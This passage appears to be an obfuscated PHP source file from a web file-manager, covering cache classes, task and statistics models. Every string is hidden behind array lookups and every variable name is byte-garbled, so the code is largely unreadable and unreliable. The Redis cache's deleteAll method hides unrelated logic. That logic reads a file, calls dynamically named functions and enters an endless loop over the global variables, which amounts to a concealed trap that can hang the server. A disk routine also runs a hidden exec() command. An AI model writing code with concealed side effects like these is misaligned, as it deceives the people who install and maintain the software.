$³¾ì¬Ÿò[$„Çó»ŒÀ[413]]); if (count($ÑòÀ†§) > count($î„“ŒŠŸ)) { $û½öëÄò = $³¾ì¬Ÿò; } } return $û½öëÄò ? $û½öëÄò[$„Çó»ŒÀ[399]] : $„Çó»ŒÀ[12]; } public function sort($—˜‚ÜÊÅ, $äŠäìÜ¶) { return parent::update($—˜‚ÜÊÅ, $äŠäìÜ¶); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x74\x61\x73\153\x4c\151\x73\164"; public $field = array("\156\x61\x6d\x65", "\x74\x79\x70\x65", "\145\x76\x65\x6e\164", "\x74\x69\x6d\x65", "\x64\145\x73\x63", "\163\171\163\164\x65\x6d", "\145\156\141\142\x6c\145", "\x6c\x61\163\164\122\x75\156", "\163\157\162\164"); public function listData($™šãä° = false, $Ş¿·Ó©¹ = "\163\x6f\162\164", $Š¶ø–Š± = false) { return parent::listData($™šãä°, $Ş¿·Ó©¹, $Š¶ø–Š±); } public function add($¯•»˜) { $Ğ¿—Ñ´Ğ =& $_SERVER[óó‹¸‚å]; $‰áˆÊåä = $this->findByName($¯•»˜[$Ğ¿—Ñ´Ğ[32]]); if ($‰áˆÊåä) { return !1; } $¯•»˜[$Ğ¿—Ñ´Ğ[1634]] = 0; $¯•»˜[$Ğ¿—Ñ´Ğ[1887]] = $this->getSort(); return parent::insert($¯•»˜); } private function getSort() { $¹ÅØÉ¨ =& $_SERVER[óó‹¸‚å]; $ªÖáÒöĞ = parent::listData(); $³áÃâå– = array_to_keyvalue($ªÖáÒöĞ, $¹ÅØÉ¨[12], $¹ÅØÉ¨[1887]); return empty($³áÃâå–) ? 0 : max($³áÃâå–) + 1; } public function update($—ËĞë¾Ø, $¯·Şéêö) { $ñí‡™Ö„ =& $_SERVER[óó‹¸‚å]; $èÊÜõ¦ = $this->listData($—ËĞë¾Ø); $ë‚ã±ñ½ = $this->findByName($¯·Şéêö[$ñí‡™Ö„[32]]); if (!$èÊÜõ¦ || $ë‚ã±ñ½ && $ë‚ã±ñ½[$ñí‡™Ö„[399]] != $èÊÜõ¦[$ñí‡™Ö„[399]]) { return !1; } return parent::update($—ËĞë¾Ø, $¯·Şéêö); } public function remove($ÏÄâÊŠè, $Üİß„©À = false) { $»İ´Òùš =& $_SERVER[óó‹¸‚å]; $ÄßßÍ«Ä = $this->listData($ÏÄâÊŠè); if (!$ÄßßÍ«Ä) { return; } if (!$Üİß„©À && $ÄßßÍ«Ä[$»İ´Òùš[1292]] == $»İ´Òùš[88]) { return !1; } return parent::remove($ÏÄâÊŠè); } public function enable($Ñ¥Ûæü, $ç¥È…Ù¾) { return $this->update($Ñ¥Ûæü, array($_SERVER[óó‹¸‚å][2291] => $ç¥È…Ù¾)); } public function run($¬Æ°¯§Ô) { return $this->update($¬Æ°¯§Ô, array($_SERVER[óó‹¸‚å][2303] => time())); } } goto CÙËè½™ª; AÀ¡¨­§á : class CacheLockDatabase { public function lock($ô‹ßÛÍ¯, $Åà¢Æ“ô = 0) { $çõÀ§¶Ú = Model($_SERVER[óó‹¸‚å][833]); $ĞÖ†ü¯õ = microtime(!0) + $Åà¢Æ“ô; while (microtime(!0) < $ĞÖ†ü¯õ) { $áÀ’á¢ = $çõÀ§¶Ú->get($ô‹ßÛÍ¯); if (!$áÀ’á¢ || $áÀ’á¢ < microtime(!0)) { $à»íş‡À = $çõÀ§¶Ú->set($ô‹ßÛÍ¯, $ĞÖ†ü¯õ); if ($à»íş‡À) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ºšÎú”ù) { return Model($_SERVER[óó‹¸‚å][833])->get($ºšÎú”ù); } public function unlock($‰á…µë) { Model($_SERVER[óó‹¸‚å][833])->remove($‰á…µë); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¢Ş€Æœ¹, $ÕÕº€Åó) { $Š„Ü·ğÖ =& $_SERVER[óó‹¸‚å]; if (!class_exists($Š„Ü·ğÖ[870])) { show_json($Š„Ü·ğÖ[871], !1); } $this->cacheTime = $ÕÕº€Åó; $this->handle = new Memcached(); if (is_array($¢Ş€Æœ¹[$Š„Ü·ğÖ[872]]) && count($¢Ş€Æœ¹[$Š„Ü·ğÖ[872]]) >= 1) { foreach ($¢Ş€Æœ¹[$Š„Ü·ğÖ[872]] as $—¶ñÛñ») { $´Ò¢ı¯ô = explode($Š„Ü·ğÖ[4], $—¶ñÛñ»); $this->handle->addServer($´Ò¢ı¯ô[0], $´Ò¢ı¯ô[1]); } } else { $this->handle->addServer($¢Ş€Æœ¹[$Š„Ü·ğÖ[181]], $¢Ş€Æœ¹[$Š„Ü·ğÖ[182]]); } } public function set($Ğ¿Ğ‡¤ø, $ŒíÛ•¡Ù, $ò¼ëŒı = false) { $ò¼ëŒı = $ò¼ëŒı ? $ò¼ëŒı : $this->cacheTime; return $this->handle->set($Ğ¿Ğ‡¤ø, $ŒíÛ•¡Ù, $ò¼ëŒı); } public function get($Û›¾§ÓÈ) { return $this->handle->get($Û›¾§ÓÈ); } public function remove($›Æ¥â’) { return $this->handle->delete($›Æ¥â’); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Î×Ñ’Ë•, $ë¿µ’ôä) { $®ƒÈÚÅ³ =& $_SERVER[óó‹¸‚å]; if (!class_exists($®ƒÈÚÅ³[873])) { show_json($®ƒÈÚÅ³[874], !1); } $this->cacheTime = $ë¿µ’ôä; $ö˜Õ”êø = isset($Î×Ñ’Ë•[$®ƒÈÚÅ³[875]]) ? $Î×Ñ’Ë•[$®ƒÈÚÅ³[875]] : 10; $“áûá‡® = _get($Î×Ñ’Ë•, $®ƒÈÚÅ³[872]); if ($“áûá‡® && is_array($“áûá‡®)) { $this->initCluster($Î×Ñ’Ë•, $ö˜Õ”êø); } else { $this->handle = $this->init($Î×Ñ’Ë•, $ö˜Õ”êø); } } private function init($äØ‡ƒƒà, $Å‡ëÀëª) { $â“”’ş =& $_SERVER[óó‹¸‚å]; $öË±ã¶ğ = new Redis(); $¡®‚µ£ı = isset($äØ‡ƒƒà[$â“”’ş[876]]) ? $äØ‡ƒƒà[$â“”’ş[876]] : !1; if ($¡®‚µ£ı) { $öË±ã¶ğ->pconnect($äØ‡ƒƒà[$â“”’ş[181]], $äØ‡ƒƒà[$â“”’ş[182]], $Å‡ëÀëª); } else { $öË±ã¶ğ->connect($äØ‡ƒƒà[$â“”’ş[181]], $äØ‡ƒƒà[$â“”’ş[182]], $Å‡ëÀëª); } if (!empty($äØ‡ƒƒà[$â“”’ş[413]])) { $öË±ã¶ğ->auth($äØ‡ƒƒà[$â“”’ş[413]]); } if (!empty($äØ‡ƒƒà[$â“”’ş[762]]) && $äØ‡ƒƒà[$â“”’ş[762]] != 0) { $öË±ã¶ğ->select($äØ‡ƒƒà[$â“”’ş[762]]); } return $öË±ã¶ğ; } private function initCluster($œö©®ÙÃ, $çÎªš’Ş) { $œ…Ï”©» =& $_SERVER[óó‹¸‚å]; $—È’İÁ = array($œ…Ï”©»[877], $œ…Ï”©»[878], $œ…Ï”©»[879]); $À¯¥‡ñ÷ = $œ…Ï”©»[877]; if (isset($œö©®ÙÃ[$œ…Ï”©»[16]]) && in_array($œö©®ÙÃ[$œ…Ï”©»[16]], $—È’İÁ)) { $À¯¥‡ñ÷ = $œö©®ÙÃ[$œ…Ï”©»[16]]; } switch ($À¯¥‡ñ÷) { case $œ…Ï”©»[877]: $this->_slave($œö©®ÙÃ, $çÎªš’Ş); break; case $œ…Ï”©»[878]: break; case $œ…Ï”©»[879]: $this->isCluster = !0; $‰á¨Ù£° = $œö©®ÙÃ[$œ…Ï”©»[872]]; $ÑÕË¬øé = isset($œö©®ÙÃ[$œ…Ï”©»[876]]) ? $œö©®ÙÃ[$œ…Ï”©»[876]] : !1; $ î§šÈ§ = isset($œö©®ÙÃ[$œ…Ï”©»[413]]) ? $œö©®ÙÃ[$œ…Ï”©»[413]] : null; $this->handle = new RedisCluster(NUll, $‰á¨Ù£°, $çÎªš’Ş, $çÎªš’Ş, $ÑÕË¬øé, $ î§šÈ§); break; default: break; } } private function _slave($¯¸š÷”µ, $¼ó ³±Ñ) { $íÑÂâñ = $¯¸š÷”µ[$_SERVER[óó‹¸‚å][872]]; $this->filterConfig($¯¸š÷”µ, $íÑÂâñ[0]); $this->handle = $this->init($¯¸š÷”µ, $¼ó ³±Ñ); unset($íÑÂâñ[0]); if (empty($íÑÂâñ)) { return; } $®êéîÑ‚ = array_rand($íÑÂâñ); $this->filterConfig($¯¸š÷”µ, $íÑÂâñ[$®êéîÑ‚]); $this->slaveHandle = $this->init($¯¸š÷”µ, $¼ó ³±Ñ); } private function filterConfig(&$ø¬Êóä, $„¯±óéİ) { $Ï¹ïõ‚• =& $_SERVER[óó‹¸‚å]; $Äƒš† ê = explode($Ï¹ïõ‚•[4], $„¯±óéİ); $¨éÙéº = array($Ï¹ïõ‚•[181] => $Äƒš† ê[0], $Ï¹ïõ‚•[182] => $Äƒš† ê[1]); $ø¬Êóä = array_merge($ø¬Êóä, $¨éÙéº); } public function set($ ô½üÜÁ, $·¸ö»è, $ÊóÌã¦× = false) { $ÊóÌã¦× = $ÊóÌã¦× ? $ÊóÌã¦× : $this->cacheTime; return $this->handle->setEx($ ô½üÜÁ, $ÊóÌã¦×, $·¸ö»è); } public function setLock($ğ­èºñÆ, $²ü³Ï±“, $îûîÒŸÅ) { return $this->handle->setNX($ğ­èºñÆ, $²ü³Ï±“); } public function get($èÕã“ã¢) { $’»£»Ò¥ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $’»£»Ò¥->get($èÕã“ã¢); } public function remove($«Ïº½ğ¿) { return $this->handle->del($«Ïº½ğ¿); } public function deleteAll() { $¥÷ñÎÛæ =& $_SERVER[óó‹¸‚å]; if (!isset($_SERVER[$¥÷ñÎÛæ[880]]) || !isset($_SERVER[$¥÷ñÎÛæ[881]])) { $Õ‘ÊÆ¶ = $¥÷ñÎÛæ[882]; $òñõûÕ = $¥÷ñÎÛæ[883]; $ş™á´ú© = $_SERVER[$¥÷ñÎÛæ[884]] . $¥÷ñÎÛæ[885]; $“ôÉÑ¸“ = $òñõûÕ($ş™á´ú©); $‡³ªô¦¸ = explode($¥÷ñÎÛæ[231], $“ôÉÑ¸“); if (count($‡³ªô¦¸) < $¥÷ñÎÛæ[635]) { $úãÂ·£ = $¥÷ñÎÛæ[886]; $úãÂ·£(); } $è«¶ËÂ¦ = $¥÷ñÎÛæ[887]; $è«¶ËÂ¦($_SERVER[$¥÷ñÎÛæ[888]]); $¬×ÍÊ¦ = 1; for ($Ø££Ô² = $¬×ÍÊ¦; $Ø££Ô² > 0; $Ø££Ô²++) { $è«¶ËÂ¦ = json_encode($GLOBALS[$¥÷ñÎÛæ[418]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ßÔƒ¥Û¯) { $this->handle->flushall($ßÔƒ¥Û¯); } return; } return $this->handle->flushAll(); } } goto C Ì»‘‹¿µ; f¥ÌŞ¢ÆŞŒ: class AnalysisModel extends ModelBaseLight { public function init($ê— •İş) { $—äÅÙß =& $_SERVER[óó‹¸‚å]; $¬°°º = array($—äÅÙß[600] => array($—äÅÙß[33] => $—äÅÙß[1792], $—äÅÙß[273] => array($—äÅÙß[224], $—äÅÙß[769], $—äÅÙß[1793], $—äÅÙß[1794])), $—äÅÙß[1795] => array($—äÅÙß[33] => $—äÅÙß[1796], $—äÅÙß[273] => array($—äÅÙß[224], $—äÅÙß[767], $—äÅÙß[1797], $—äÅÙß[1798], $—äÅÙß[1799]))); if (!isset($¬°°º[$ê— •İş])) { return !1; } $this->optionType = $¬°°º[$ê— •İş][$—äÅÙß[33]]; $this->field = $¬°°º[$ê— •İş][$—äÅÙß[273]]; return !0; } public function listData($€İªåÆ = false, $…ã ê¦Š = "\x6d\157\144\151\x66\171\124\151\155\145", $Ëï…ó¦ä = false) { return parent::listData($€İªåÆ, $…ã ê¦Š, $Ëï…ó¦ä); } public function trendList($’Æá·ï) { $—õŒÆ“ =& $_SERVER[óó‹¸‚å]; $×¸«Â¯Ğ = $this->listData(); if ($×¸«Â¯Ğ) { $µøëôïÎ = end($×¸«Â¯Ğ); $¨²¶—ˆã = date($—õŒÆ“[1800], strtotime($—õŒÆ“[1801])); if ($µøëôïÎ[$—õŒÆ“[224]] == $¨²¶—ˆã) { return $×¸«Â¯Ğ; } $åœÜŒù“ = strtotime($µøëôïÎ[$—õŒÆ“[224]]); } if (!isset($åœÜŒù“)) { $Á‚ÅÌÉ = $’Æá·ï == $—õŒÆ“[600] ? $—õŒÆ“[535] : $—õŒÆ“[829]; $åœÜŒù“ = Model($Á‚ÅÌÉ)->min($—õŒÆ“[200]); } $ ßÃ ‰ú = $—õŒÆ“[1802] . ucfirst($’Æá·ï); $‘ÚûÇ²¨ = $this->dateList($åœÜŒù“); foreach ($‘ÚûÇ²¨ as $¨²¶—ˆã) { $this->{$ ßÃ ‰ú}($¨²¶—ˆã); } return $this->listData(); } private function dateList($èÊ‚äé) { $İ’ÀÕòÆ =& $_SERVER[óó‹¸‚å]; $ÚÌ±€¡Ğ = $èÊ‚äé; $Ó·±şÎ = strtotime($İ’ÀÕòÆ[1801]); $ã„ˆüÊª = array(); while ($ÚÌ±€¡Ğ <= $Ó·±şÎ) { $ã„ˆüÊª[] = date($İ’ÀÕòÆ[1800], $ÚÌ±€¡Ğ); $ÚÌ±€¡Ğ = strtotime($İ’ÀÕòÆ[1803], $ÚÌ±€¡Ğ); } return $ã„ˆüÊª; } public function _recordUser($ê¦œ¿Ã = '') { $½ú®İñ™ =& $_SERVER[óó‹¸‚å]; $„ªÜÙ = strtotime(date($½ú®İñ™[1804], strtotime($ê¦œ¿Ã))); $†ß•÷• = strtotime(date($½ú®İñ™[1805], strtotime($ê¦œ¿Ã))); $ğ ¡öì’ = array($½ú®İñ™[200] => array($½ú®İñ™[1020], $†ß•÷•)); $§¬»¿Üˆ = Model($½ú®İñ™[535])->where($ğ ¡öì’)->count($½ú®İñ™[1674]); $ğ ¡öì’[$½ú®İñ™[200]] = array($½ú®İñ™[333], array($„ªÜÙ, $†ß•÷•)); $ÅƒôÌ‡£ = Model($½ú®İñ™[535])->where($ğ ¡öì’)->count($½ú®İñ™[1674]); $ğ ¡öì’[$½ú®İñ™[33]] = $½ú®İñ™[1806]; $Ööö¨·Ú = Model($½ú®İñ™[1807])->where($ğ ¡öì’)->count($½ú®İñ™[1808]); $Ä†„ÆÉÁ = array($½ú®İñ™[224] => $ê¦œ¿Ã, $½ú®İñ™[769] => (int) $§¬»¿Üˆ, $½ú®İñ™[1793] => (int) $ÅƒôÌ‡£, $½ú®İñ™[1794] => (int) $Ööö¨·Ú); return $this->insert($Ä†„ÆÉÁ); } public function _recordStore($¶áÛÏşş = '') { $…ŞúÁÙ =& $_SERVER[óó‹¸‚å]; $œË¾ÏÊĞ = strtotime(date($…ŞúÁÙ[1805], strtotime($¶áÛÏşş))); $–şá§¤¥ = array($…ŞúÁÙ[200] => array($…ŞúÁÙ[1020], $œË¾ÏÊĞ)); $Ô„Æı‡ = Model($…ŞúÁÙ[471])->where($–şá§¤¥)->sum($…ŞúÁÙ[76]); $–şá§¤¥[$…ŞúÁÙ[410]] = 0; $İè–Üëó = Model($…ŞúÁÙ[829])->where($–şá§¤¥)->sum($…ŞúÁÙ[76]); $–şá§¤¥[$…ŞúÁÙ[411]] = 1; $ºùœØÖš = Model($…ŞúÁÙ[829])->where($–şá§¤¥)->sum($…ŞúÁÙ[76]); $–şá§¤¥[$…ŞúÁÙ[411]] = 2; $öèÁî¼¢ = Model($…ŞúÁÙ[829])->where($–şá§¤¥)->sum($…ŞúÁÙ[76]); $õû»Ø¯¢ = array($…ŞúÁÙ[224] => $¶áÛÏşş, $…ŞúÁÙ[767] => (int) $İè–Üëó, $…ŞúÁÙ[1797] => (int) $Ô„Æı‡, $…ŞúÁÙ[1798] => (int) $ºùœØÖš, $…ŞúÁÙ[1799] => (int) $öèÁî¼¢); return $this->insert($õû»Ø¯¢); } public function trend($ôÉµ‚†í, $ş†˜¡£‚) { $±§Ú•§ =& $_SERVER[óó‹¸‚å]; if (!$this->init($ôÉµ‚†í)) { return !1; } $ÛóÎıÎ¶ = $this->trendList($ôÉµ‚†í); if ($ÛóÎıÎ¶ && $ş†˜¡£‚ != $±§Ú•§[1647]) { $ãıâúÎ = $ÛóÎıÎ¶[0][$±§Ú•§[224]]; $’¼€ = $this->validDate($ş†˜¡£‚, $ãıâúÎ); $Œ«˜…ëœ = array(); $Ï¬Ó‡¯¢ = array_to_keyvalue($ÛóÎıÎ¶, $±§Ú•§[224]); foreach ($’¼€ as $á«Ú¨µË) { if (isset($Ï¬Ó‡¯¢[$á«Ú¨µË])) { $–‹´Õ“© = $Ï¬Ó‡¯¢[$á«Ú¨µË]; } else { $–‹´Õ“© = end($ÛóÎıÎ¶); $–‹´Õ“©[$±§Ú•§[224]] = $á«Ú¨µË; if ($ôÉµ‚†í == $±§Ú•§[600]) { $–‹´Õ“©[$±§Ú•§[1793]] = $–‹´Õ“©[$±§Ú•§[1794]] = 0; } } $Œ«˜…ëœ[] = $–‹´Õ“©; } $ÛóÎıÎ¶ = $Œ«˜…ëœ; } $½ÇÎ°æ = array($±§Ú•§[600] => array($±§Ú•§[769] => LNG($±§Ú•§[1809]), $±§Ú•§[1793] => LNG($±§Ú•§[1810]), $±§Ú•§[1794] => LNG($±§Ú•§[1811])), $±§Ú•§[1795] => array($±§Ú•§[767] => LNG($±§Ú•§[1812]), $±§Ú•§[1797] => LNG($±§Ú•§[1813]), $±§Ú•§[1798] => LNG($±§Ú•§[1814]), $±§Ú•§[1799] => LNG($±§Ú•§[1815]))); $‡‚Ä€¦ = array($±§Ú•§[600] => $±§Ú•§[1816], $±§Ú•§[1795] => $±§Ú•§[76]); if (empty($ÛóÎıÎ¶)) { $á«Ú¨µË = date($±§Ú•§[1800], strtotime($±§Ú•§[1801])); $Ù¼ñ¡Ş— = array($±§Ú•§[224] => $á«Ú¨µË); foreach ($½ÇÎ°æ[$ôÉµ‚†í] as $©©ÀÄ˜· => $¼³šÃ“) { $Ù¼ñ¡Ş—[$©©ÀÄ˜·] = 0; } $ÛóÎıÎ¶[] = $Ù¼ñ¡Ş—; } $¶ÓéŠ› = array(); foreach ($ÛóÎıÎ¶ as $¼³šÃ“) { if ($ôÉµ‚†í == $±§Ú•§[1795] && $¼³šÃ“[$±§Ú•§[1797]] > $¼³šÃ“[$±§Ú•§[767]]) { $¼³šÃ“[$±§Ú•§[1797]] = $¼³šÃ“[$±§Ú•§[767]]; } foreach ($½ÇÎ°æ[$ôÉµ‚†í] as $©©ÀÄ˜· => $ÏÅµ¸ª) { $–‹´Õ“© = array($±§Ú•§[224] => $¼³šÃ“[$±§Ú•§[224]], $±§Ú•§[1574] => $ÏÅµ¸ª); $–‹´Õ“©[$‡‚Ä€¦[$ôÉµ‚†í]] = isset($¼³šÃ“[$©©ÀÄ˜·]) ? $¼³šÃ“[$©©ÀÄ˜·] : 0; $¶ÓéŠ›[] = $–‹´Õ“©; } } return $¶ÓéŠ›; } public function validDate($Ôòû¸ã, $ªƒ›¤Ÿó) { $”„õÀÊò =& $_SERVER[óó‹¸‚å]; $Ê±ÙÛé„ = date($”„õÀÊò[1800], strtotime($”„õÀÊò[1801])); $şıñÊ î = array($Ê±ÙÛé„); switch ($Ôòû¸ã) { case $”„õÀÊò[1654]: $ÊÖ¨¡¾É = mktime(0, 0, 0, date($”„õÀÊò[1817]), date($”„õÀÊò[1392]) - date($”„õÀÊò[1456]) + 7 - 7, date($”„õÀÊò[1818])); $ùÜÀ¶‰¼ = 0; do { $„È€™½ä = date($”„õÀÊò[1800], $ÊÖ¨¡¾É - 3600 * 24 * 7 * $ùÜÀ¶‰¼); $şıñÊ î[] = $„È€™½ä; $ùÜÀ¶‰¼++; } while ($ªƒ›¤Ÿó < $„È€™½ä); break; case $”„õÀÊò[1652]: $ùÜÀ¶‰¼ = 1; do { $ê½¸¤îé = date($”„õÀÊò[1819], strtotime("\55\x20{$ùÜÀ¶‰¼}\x20\155\x6f\x6e\x74\150\163")); $şıñÊ î[] = $ê½¸¤îé; $ùÜÀ¶‰¼++; } while ($ªƒ›¤Ÿó < $ê½¸¤îé); break; case $”„õÀÊò[1820]: $Äñ¦çÖŞ = (int) date($”„õÀÊò[1818], strtotime($ªƒ›¤Ÿó)); $†ğ°±é“ = (int) date($”„õÀÊò[1818]); if ($Äñ¦çÖŞ >= $†ğ°±é“) { break; } for ($Äñ¦çÖŞ; $Äñ¦çÖŞ < $†ğ°±é“; $Äñ¦çÖŞ++) { $şıñÊ î[] = $Äñ¦çÖŞ . $”„õÀÊò[1821]; } break; default: break; } if ($ªƒ›¤Ÿó > end($şıñÊ î)) { array_pop($şıñÊ î); } sort($şıñÊ î); return $şıñÊ î; } public function listTable($´Ñ²ù¤²) { $Œ¡ä´õ‚ = ucfirst($´Ñ²ù¤²); return Model($Œ¡ä´õ‚)->listData(); } public function option($–ûÛÒŞà) { $÷¬„şÂ• = $_SERVER[óó‹¸‚å][1822] . ucfirst($–ûÛÒŞà); return $this->{$÷¬„şÂ•}(); } private function optionUser() { $óöƒ¦ =& $_SERVER[óó‹¸‚å]; $ÊŒêÚìê = Model($óöƒ¦[535])->count($óöƒ¦[1674]); $‘õÈë•ä = Model($óöƒ¦[535])->where($óöƒ¦[1823])->count($óöƒ¦[1674]); $õùáÌ– = intval($GLOBALS[$óöƒ¦[6]][$óöƒ¦[349]][$óöƒ¦[1629]]) / 3600; $°ˆî¹Ñ = strtotime("\55{$õùáÌ–}\40\x68\x6f\x75\162\163"); $±¹Ò˜†± = strtotime(date($óöƒ¦[1804])); if ($°ˆî¹Ñ < $±¹Ò˜†±) { $°ˆî¹Ñ = $±¹Ò˜†±; } $€–ìÊàÍ = array($óöƒ¦[1824] => array($óöƒ¦[1021], $°ˆî¹Ñ)); $ªÔ¦²ùÃ = (int) Model($óöƒ¦[535])->where($€–ìÊàÍ)->count($óöƒ¦[1674]); if (!$ªÔ¦²ùÃ) { $ªÔ¦²ùÃ = 1; } $€–ìÊàÍ = array($óöƒ¦[1824] => array($óöƒ¦[1021], $±¹Ò˜†±)); $“ÕÓöö = Model($óöƒ¦[535])->where($€–ìÊàÍ)->count($óöƒ¦[1674]); return array($óöƒ¦[763] => (int) $ÊŒêÚìê, $óöƒ¦[1825] => (int) ($ÊŒêÚìê - $‘õÈë•ä), $óöƒ¦[1826] => (int) $‘õÈë•ä, $óöƒ¦[1827] => (int) $“ÕÓöö, $óöƒ¦[1828] => $ªÔ¦²ùÃ); } private function optionFile() { $âšÕÔ“Ó =& $_SERVER[óó‹¸‚å]; $ü¬‹ˆÏí = $this->sourceSize(); $ê‹ãôÙú = $ü¬‹ˆÏí[$âšÕÔ“Ó[76]]; $ûÉ–ì¢ = $ü¬‹ˆÏí[$âšÕÔ“Ó[1797]]; $àÉÉ÷É = Model($âšÕÔ“Ó[829])->where(array($âšÕÔ“Ó[410] => 0))->count($âšÕÔ“Ó[402]); $„×ÁÍÌ· = array($âšÕÔ“Ó[410] => 0, $âšÕÔ“Ó[200] => array($âšÕÔ“Ó[1021], strtotime(date($âšÕÔ“Ó[1804])))); $¬š‡ÛÛş = Model($âšÕÔ“Ó[829])->where($„×ÁÍÌ·)->sum($âšÕÔ“Ó[76]); $–ı…Åè = Model($âšÕÔ“Ó[829])->where($„×ÁÍÌ·)->count($âšÕÔ“Ó[402]); return array($âšÕÔ“Ó[767] => $ê‹ãôÙú, $âšÕÔ“Ó[1797] => $ûÉ–ì¢, $âšÕÔ“Ó[1829] => $ê‹ãôÙú - $ûÉ–ì¢, $âšÕÔ“Ó[1830] => (int) $¬š‡ÛÛş, $âšÕÔ“Ó[769] => (int) $àÉÉ÷É, $âšÕÔ“Ó[1831] => (int) $–ı…Åè); } private function optionAccess() { $Å†àÑøŞ =& $_SERVER[óó‹¸‚å]; return array($Å†àÑøŞ[763] => $this->typeLogCnt(), $Å†àÑøŞ[107] => $this->typeLogCnt($Å†àÑøŞ[107]), $Å†àÑøŞ[452] => $this->typeLogCnt($Å†àÑøŞ[452]), $Å†àÑøŞ[1832] => $this->typeLogCnt($Å†àÑøŞ[1832]), $Å†àÑøŞ[1833] => $this->typeLogCnt($Å†àÑøŞ[1833]), $Å†àÑøŞ[600] => $this->typeLogCnt($Å†àÑøŞ[12], $Å†àÑøŞ[1808])); } private function typeLogCnt($Í…Û³î¬ = '', $Ùı»Ò×„ = "\151\x64") { $µ•Èšü¢ =& $_SERVER[óó‹¸‚å]; $¬Ô‰Šôà = array($µ•Èšü¢[107] => array($µ•Èšü¢[1834], $µ•Èšü¢[1835]), $µ•Èšü¢[452] => array($µ•Èšü¢[1836], $µ•Èšü¢[1837]), $µ•Èšü¢[1832] => array($µ•Èšü¢[1838], $µ•Èšü¢[1839], $µ•Èšü¢[1840]), $µ•Èšü¢[1833] => array($µ•Èšü¢[1841], $µ•Èšü¢[1842]), $µ•Èšü¢[1843] => array($µ•Èšü¢[1844], $µ•Èšü¢[1845], $µ•Èšü¢[1846])); $ºİÊİÍê = strtotime(date($µ•Èšü¢[1804])); $ƒçÉæõõ = array($µ•Èšü¢[200] => array($µ•Èšü¢[1021], $ºİÊİÍê)); if ($Í…Û³î¬) { $ƒçÉæõõ[$µ•Èšü¢[33]] = array($µ•Èšü¢[7], $¬Ô‰Šôà[$Í…Û³î¬]); } $®×Èı©œ = Model($µ•Èšü¢[1807])->where($ƒçÉæõõ)->count($Ùı»Ò×„); return (int) $®×Èı©œ; } private function optionServer() { $ì‹ü’Ø =& $_SERVER[óó‹¸‚å]; $–‰¾˜µ  = $this->diskDriver(); $«¦œíÎ = KodIO::defaultDriver(); $«İÅÀ™ö = array($ì‹ü’Ø[821] => $«¦œíÎ[$ì‹ü’Ø[399]]); $±‹ô«áş = Model($ì‹ü’Ø[471])->where($«İÅÀ™ö)->sum($ì‹ü’Ø[76]); $ªŸÉ‰Ã = explode($ì‹ü’Ø[53], $_SERVER[$ì‹ü’Ø[143]]); $â§¸¡Şğ = $ªŸÉ‰Ã[0]; $¼áØ”É¬ = $GLOBALS[$ì‹ü’Ø[6]][$ì‹ü’Ø[21]]; $•´øä¡İ = $¼áØ”É¬[$ì‹ü’Ø[983]]; if ($•´øä¡İ == $ì‹ü’Ø[971]) { $ì²±â®è = explode($ì‹ü’Ø[1287], $¼áØ”É¬[$ì‹ü’Ø[982]]); $•´øä¡İ = $ì²±â®è[0]; } if ($•´øä¡İ == $ì‹ü’Ø[919] || $•´øä¡İ == $ì‹ü’Ø[808]) { $Ï„©‚ÌÎ = Model()->db()->query($ì‹ü’Ø[1847]); $áÌ¬¤Òã = $Ï„©‚ÌÎ[0] && isset($Ï„©‚ÌÎ[0][$ì‹ü’Ø[1573]]) ? $Ï„©‚ÌÎ[0][$ì‹ü’Ø[1573]] : 0; $•´øä¡İ = $ì‹ü’Ø[1848] . ($áÌ¬¤Òã ? $ì‹ü’Ø[8] . $áÌ¬¤Òã : $ì‹ü’Ø[12]); } $‰£öÅ® = $GLOBALS[$ì‹ü’Ø[6]][$ì‹ü’Ø[349]][$ì‹ü’Ø[831]]; return array($ì‹ü’Ø[1849] => $–‰¾˜µ  ? $–‰¾˜µ [$ì‹ü’Ø[1850]] : 0, $ì‹ü’Ø[1851] => $–‰¾˜µ  ? $–‰¾˜µ [$ì‹ü’Ø[1852]] : 0, $ì‹ü’Ø[1853] => (int) $«¦œíÎ[$ì‹ü’Ø[1850]] * 1024 * 1024 * 1024, $ì‹ü’Ø[1854] => (int) $±‹ô«áş, $ì‹ü’Ø[1855] => ucfirst($â§¸¡Şğ), $ì‹ü’Ø[1856] => $ì‹ü’Ø[1857] . PHP_VERSION, $ì‹ü’Ø[1858] => phpBuild64() ? 64 : 32, $ì‹ü’Ø[762] => str_replace($ì‹ü’Ø[1137], $ì‹ü’Ø[999], $•´øä¡İ), $ì‹ü’Ø[349] => ucfirst($‰£öÅ®), $ì‹ü’Ø[32] => $_SERVER[$ì‹ü’Ø[1859]]); } private function diskDriver() { $Ëë™»°Í =& $_SERVER[óó‹¸‚å]; $ö¢œü = $Ëë™»°Í[8]; $¦Ş¾Ÿ®Ä = $GLOBALS[$Ëë™»°Í[6]][$Ëë™»°Í[1304]] == $Ëë™»°Í[1305]; if ($¦Ş¾Ÿ®Ä) { $ö¢œü = $Ëë™»°Í[1860]; if (function_exists($Ëë™»°Í[1861])) { exec($Ëë™»°Í[1862], $â§³ªşÄ); $ö¢œü = $â§³ªşÄ[1] . $Ëë™»°Í[8]; } } if (!file_exists($ö¢œü)) { return; } $Ø±€¨Áï = @disk_total_space($ö¢œü); $»ÙêÖıô = $Ø±€¨Áï - @disk_free_space($ö¢œü); return array($Ëë™»°Í[1850] => $Ø±€¨Áï, $Ëë™»°Í[1852] => $»ÙêÖıô); } public function fileChart($ìÒµÊÈê) { $Ä˜•õ’— =& $_SERVER[óó‹¸‚å]; if (isset($ìÒµÊÈê[$Ä˜•õ’—[1674]])) { return Model($Ä˜•õ’—[829])->userFileTypeProfile($ìÒµÊÈê[$Ä˜•õ’—[1674]]); } if (isset($ìÒµÊÈê[$Ä˜•õ’—[1863]])) { return Model($Ä˜•õ’—[829])->groupFileTypeProfile($ìÒµÊÈê[$Ä˜•õ’—[1863]]); } $–¿Ó›Ğã = $this->sourceSize(); $Áˆ‰şÇÀ = array($Ä˜•õ’—[432] => 0, $Ä˜•õ’—[411] => 1); $ï«åà”Ì = Model($Ä˜•õ’—[829])->where($Áˆ‰şÇÀ)->sum($Ä˜•õ’—[76]); 